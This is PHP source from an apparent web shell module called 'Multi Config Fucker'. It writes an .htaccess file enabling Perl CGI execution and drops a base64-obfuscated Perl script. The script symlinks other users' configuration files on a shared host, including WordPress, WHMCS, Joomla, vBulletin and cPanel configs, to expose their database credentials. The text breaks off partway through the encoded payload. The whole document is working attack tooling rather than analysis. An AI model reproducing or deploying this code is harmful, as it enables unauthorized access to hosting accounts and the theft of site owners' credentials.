<form action="?y=<?php echo $pwd; ?>&amp;x=config" method="post">
<br><br><center><b><font size=4>+--=[ Multi Config Fucker ]=--+</font></b></center>
	<form method=post><br><center><table class='tabnet'>
	<tr><th colspan='5'><b>Multi Config Fucker</b></th></tr>
	<tr><th><b>Php Config</b></th><th><b>Perl Config</b></th><th><b>Litespeed Config Fucker</b></th><th><b>Config Fucker .ini Method</b></th></tr>
	<tr><td><input class='inputzbut' type='submit'name='phpconfig' value="Php Config" /></td><td>
	<input class='inputzbut' type='submit' name='perlconfig' value="Perl Config" /></td><td>
	<input class='inputzbut' type='submit' name='lcf' value="Litespeed Config Fucker" /></td><td>
	<input class='inputzbut' type='submit' name='configini' value="Config Fucker .ini Method" /></td><tr></table>
	</center></form><br><hr><br><br>
 <?php
 @ini_set('html_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0);

#==================[ Multi BConfig Fucker ]==================#

if(isset($_POST['configini']))
{ echo "<center/><b><font color=>+--==[ Config Fucker .ini Method ]==--+</font></b><br><br>";

  mkdir('CFI', 0755);
    chdir('CFI');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Error gan!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI \n AddType application/x-httpd-cgi .pl \n AddHandler cgi-script .pl \n AddHandler cgi-script .pl";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);

$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5Db25maWcgRnVja2VyIFVzaW5nIC5pbmkgTWV0aG9kPC90aXRsZT4NCjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cDovL3BuZy0zLmZpbmRpY29ucy5jb20vZmlsZXMvaWNvbnMvMTkzNS9yZWRfZ2Vtc192b2xfMi8xMjgvcjJfZHJhZ29uLnBuZyIvPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkgew0KCWJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQoNCn0NCi5uZXdTdHlsZTEgew0KIGZvbnQtZmFtaWx5OiBUYWhvbWE7DQogZm9udC1zaXplOiB4LXNtYWxsOw0KIGZvbnQtd2VpZ2h0OiBib2xkOw0KIGNvbG9yOiAjMDBmZjAwOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQogICAgKCR1c2VyKSA9IEBfOw0KJG1zciA9IHF4e3B3ZH07DQokZG9tYWluPSRtc3IuIi8iLiR1c2VyOw0KJGRvbWFpbj1+cy9cbi8vZzsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci5pbmknKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5pbmknKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS5pbmknKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdlYi5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtcHJvdGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4uaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXRlc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXByb3RhbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1zaXRlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbWFpbi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ldy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52YjMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+cGFuZWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RpbmcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLVpDc2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGVudHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnL2tvbmVrc2kucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWExLmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TU0kucGhwJywkZG9tYWluLid+fj5DTUYtZm9ydW0uaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLWZvcnVtLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk90aGVyLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywkZG9tYWluLid+fj5CYWxpdGJhbmcuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnRzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmcuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5ncy5pbmknKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS5pbmknKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywkZG9tYWluLid+fj5waHBiYjMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htY3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htYy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRkb21haW4uJ35+PndobWNzMi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+V2htOS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2UuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3Atc2hvcHBpbmcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS5pbmknKTs